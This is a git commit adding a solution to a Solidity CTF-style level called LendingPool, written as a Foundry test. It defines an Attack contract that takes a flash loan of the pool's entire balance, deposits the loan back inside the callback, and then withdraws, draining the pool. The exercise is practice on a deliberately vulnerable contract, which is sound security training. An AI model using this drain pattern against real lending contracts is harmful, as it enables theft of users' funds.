fefac53fd1945e04f242242997efe5e3b631f701
Lapo4kaKek <Sheydos2003@yandex.ru>
2024-10-25 15:19:23 +0000

    feat: added solutiob for lendingPool

--- test/08_LendingPool.t.sol
+++ test/08_LendingPool.t.sol
@@ -2,7 +2,7 @@
 pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
-import "src/08_LendingPool/LendingPool.sol";
+import "../src/08_LendingPool/LendingPool.sol";
 
 // forge test --match-contract LendingPoolTest -vvvv
 contract LendingPoolTest is BaseTest {
@@ -15,11 +15,31 @@ contract LendingPoolTest is BaseTest {
 
     function testExploitLevel() public {
         /* YOUR EXPLOIT GOES HERE */
-
+        Attack attack = new Attack(instance);
+        attack.attack();
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
     }
+}
+
+contract Attack is IFlashLoanReceiver {
+    LendingPool public target;
+
+    constructor(LendingPool _target) {
+        target = _target;
+    }
+
+    function attack() external {
+        target.flashLoan(address(target).balance);
+        target.withdraw();
+    }
+
+    function execute() external payable override {
+        target.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
 }
